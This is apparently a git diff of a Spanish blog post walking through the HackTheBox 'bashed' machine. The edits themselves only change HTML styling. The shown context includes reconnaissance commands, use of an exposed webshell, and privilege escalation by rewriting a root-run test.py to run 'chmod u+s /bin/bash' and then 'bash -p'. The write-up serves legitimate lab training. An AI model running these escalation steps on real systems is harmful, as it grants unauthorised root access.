@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/bashed/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="highlighter-rouge">bashed</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">bashed</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">bashed</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">bashed</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack bashed 
 <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.68
   
@@ -38,7 +38,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 80/tcp open  http
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p80</span> <span class="nt">-sCV</span> 10.10.10.68 <span class="nt">-oN</span> versions
 PORT   STATE SERVICE VERSION
@@ -49,17 +49,17 @@ PORT   STATE SERVICE VERSION
 
 <h2 id="reconocimiento-web">RECONOCIMIENTO WEB</h2>
 
-<p>Iniciamos con el reconocimiento del puerto <code class="highlighter-rouge">80</code> por medio de la utilidad <code class="highlighter-rouge">whatweb</code> para identificar software que sea potencialmente vulnerable o de utilidad para nosotros.</p>
+<p>Iniciamos con el reconocimiento del puerto <code class="language-plaintext highlighter-rouge">80</code> por medio de la utilidad <code class="language-plaintext highlighter-rouge">whatweb</code> para identificar software que sea potencialmente vulnerable o de utilidad para nosotros.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.68
 http://10.10.10.68 <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.68], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel<span class="s1">'s Development Site]
 </span></code></pre></div></div>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/bashed/03-page.png" />
 </p>
 
-<p>Poco podemos utilizar de la información obtenida, así que vamos a realizar fuzzing por medio de <code class="highlighter-rouge">wfuzz</code>, esta vez para encontrar rutas con posible contenido que pueda ser útil.</p>
+<p>Poco podemos utilizar de la información obtenida, así que vamos a realizar fuzzing por medio de <code class="language-plaintext highlighter-rouge">wfuzz</code>, esta vez para encontrar rutas con posible contenido que pueda ser útil.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.68/FUZZ
 <span class="o">=====================================================================</span>
@@ -74,13 +74,13 @@ ID           Response   Lines    Word       Chars       Payload
 000000150:   301        9 L      28 W       312 Ch      "</span>uploads<span class="s2">"
 </span></code></pre></div></div>
 
-<p>Vamos a revisar la ruta <code class="highlighter-rouge">dev</code> y cómo podemos ver encontramos una webshell embebida en la página web, por lo que vamos a aprovechar este recurso para generar una reverse shell y tener un acceso directo desde nuestra máquina.</p>
+<p>Vamos a revisar la ruta <code class="language-plaintext highlighter-rouge">dev</code> y cómo podemos ver encontramos una webshell embebida en la página web, por lo que vamos a aprovechar este recurso para generar una reverse shell y tener un acceso directo desde nuestra máquina.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/bashed/04-page2.png" />
 </p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/bashed/05-page3.png" />
 </p>
 
@@ -104,13 +104,13 @@ hostname
 </span>bashed
 </code></pre></div></div>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/bashed/06-page4.png" /> 
 </p>
 
 <h2 id="flag-user">FLAG USER</h2>
 
-<p>Una vez tenemos acceso a la máquina, tenemos la posibilidad de leer la flag <code class="highlighter-rouge">user</code></p>
+<p>Una vez tenemos acceso a la máquina, tenemos la posibilidad de leer la flag <code class="language-plaintext highlighter-rouge">user</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed:/var/www/html/dev<span class="nv">$ </span>find / <span class="nt">-name</span> user.txt 2&gt;/dev/null
 /home/arrexel/user.txt
@@ -119,7 +119,7 @@ www-data@bashed:/var/www/html/dev<span class="nv">$ </span><span class="nb">head
 </code></pre></div></div>
 <h2 id="escalada-de-privilegios-scriptmanager">ESCALADA DE PRIVILEGIOS SCRIPTMANAGER</h2>
 
-<p>Necesitamos escalar privilegios para poder llegar a la flag <code class="highlighter-rouge">root</code>, así que vamos a enumerar permisos de sudo que tenemos actualmente.</p>
+<p>Necesitamos escalar privilegios para poder llegar a la flag <code class="language-plaintext highlighter-rouge">root</code>, así que vamos a enumerar permisos de sudo que tenemos actualmente.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed:/var/www/html/dev<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
 Matching Defaults entries <span class="k">for </span>www-data on bashed:
@@ -130,7 +130,7 @@ User www-data may run the following commands on bashed:
     <span class="o">(</span>scriptmanager : scriptmanager<span class="o">)</span> NOPASSWD: ALL
 </code></pre></div></div>
 
-<p>Podemos identificar que podemos ejecutar cualquier tipo de comando sin contraseña como el usuario <code class="highlighter-rouge">scriptmanager</code>, por lo que vamos a ejecutar el comando <code class="highlighter-rouge">bash</code> para obtener una shell con permisos del usuario recién encontrado.</p>
+<p>Podemos identificar que podemos ejecutar cualquier tipo de comando sin contraseña como el usuario <code class="language-plaintext highlighter-rouge">scriptmanager</code>, por lo que vamos a ejecutar el comando <code class="language-plaintext highlighter-rouge">bash</code> para obtener una shell con permisos del usuario recién encontrado.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed:/var/www/html/dev<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> scriptmanager bash
 scriptmanager@bashed:/var/www/html/dev<span class="nv">$ </span><span class="nb">whoami
@@ -139,7 +139,7 @@ scriptmanager@bashed:/var/www/html/dev<span class="nv">$ </span><span class="nb"
 
 <h2 id="escalada-de-privilegios-root">ESCALADA DE PRIVILEGIOS ROOT</h2>
 
-<p>Necesitamos tener acceso al usuario <code class="highlighter-rouge">root</code>, así que realizamos una enumeración de directorios y podemos identificar un archivo <code class="highlighter-rouge">test.py</code>, el cual, pretende ejecutar una acción y obtiene como salida un <code class="highlighter-rouge">txt</code> con permisos de administración.</p>
+<p>Necesitamos tener acceso al usuario <code class="language-plaintext highlighter-rouge">root</code>, así que realizamos una enumeración de directorios y podemos identificar un archivo <code class="language-plaintext highlighter-rouge">test.py</code>, el cual, pretende ejecutar una acción y obtiene como salida un <code class="language-plaintext highlighter-rouge">txt</code> con permisos de administración.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dscriptmanager@bashed:/<span class="nv">$ </span><span class="nb">cd </span>scripts
 scriptmanager@bashed:/scripts<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
@@ -152,7 +152,7 @@ drwxr-xr-x 23 root          root          4096 Jun  2 07:25 ..
 
 <h2 id="procmonsh">PROCMON.SH</h2>
 
-<p>Para esta ocasión vamos a hacer uso de un script enumerador de procesos que denominaremos <code class="highlighter-rouge">procmon.sh</code>, esto  con la finalidad de monitorear los comandos que son ejecutados en tiempo real por la máquina, para esto ingresamos a la carpeta <code class="highlighter-rouge">/tmp</code> y creamos el siguiente script de monitoreo.</p>
+<p>Para esta ocasión vamos a hacer uso de un script enumerador de procesos que denominaremos <code class="language-plaintext highlighter-rouge">procmon.sh</code>, esto  con la finalidad de monitorear los comandos que son ejecutados en tiempo real por la máquina, para esto ingresamos a la carpeta <code class="language-plaintext highlighter-rouge">/tmp</code> y creamos el siguiente script de monitoreo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
 
@@ -167,7 +167,7 @@ nano procmon.sh
 <span class="k">done</span>
 </code></pre></div></div>
 
-<p>Damos permisos de ejecución a nuestro archivo y procedemos a ver en el output que se está ejecutando <code class="highlighter-rouge">test-py</code> periódicamente.</p>
+<p>Damos permisos de ejecución a nuestro archivo y procedemos a ver en el output que se está ejecutando <code class="language-plaintext highlighter-rouge">test-py</code> periódicamente.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x procmon.sh
 
@@ -179,7 +179,7 @@ nano procmon.sh
 &lt; python test.py
 </code></pre></div></div>
 
-<p>Muy bien, ahora que identificamos que el archivo <code class="highlighter-rouge">test.py</code> se está ejecutando y tenemos capacidad de escritura en el mismo, manipularemos el código para generar un permiso SUID en <code class="highlighter-rouge">/bin/bash</code>.</p>
+<p>Muy bien, ahora que identificamos que el archivo <code class="language-plaintext highlighter-rouge">test.py</code> se está ejecutando y tenemos capacidad de escritura en el mismo, manipularemos el código para generar un permiso SUID en <code class="language-plaintext highlighter-rouge">/bin/bash</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano test.py
 
@@ -187,13 +187,13 @@ import os
 os.system<span class="o">(</span><span class="s2">"chmod u+s /bin/bash"</span><span class="o">)</span>
 </code></pre></div></div>
 
-<p>Procedemos a monitorear el comando <code class="highlighter-rouge">ls -la /bin/bash</code> para detectar el momento en que tenga permisos como SUID.</p>
+<p>Procedemos a monitorear el comando <code class="language-plaintext highlighter-rouge">ls -la /bin/bash</code> para detectar el momento en que tenga permisos como SUID.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>watch <span class="nt">-n</span> 1 <span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
 <span class="nt">-rwsr-xr-x</span> 1 root root 1037528 Jun 24  2016 /bin/bash
 </code></pre></div></div>
 
-<p>¡Ya estamos terminando! Ahora vamos a ejecutar el comando <code class="highlighter-rouge">bash -p</code> que nos va a dar automáticamente una shell con permisos de <code class="highlighter-rouge">root</code>, esto gracias a la asignación de permisos <em>SUID</em>.</p>
+<p>¡Ya estamos terminando! Ahora vamos a ejecutar el comando <code class="language-plaintext highlighter-rouge">bash -p</code> que nos va a dar automáticamente una shell con permisos de <code class="language-plaintext highlighter-rouge">root</code>, esto gracias a la asignación de permisos <em>SUID</em>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scriptmanager@bashed:/scripts<span class="nv">$ </span>bash <span class="nt">-p</span>
 bash-4.3# <span class="nb">whoami
@@ -208,9 +208,9 @@ bash-4.3# <span class="nb">head</span> <span class="nt">-c</span> 10 /root/root.
 </span>e2e427545
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">bashed</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">bashed</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/bashed/07-finish.png" />
 </p>
 
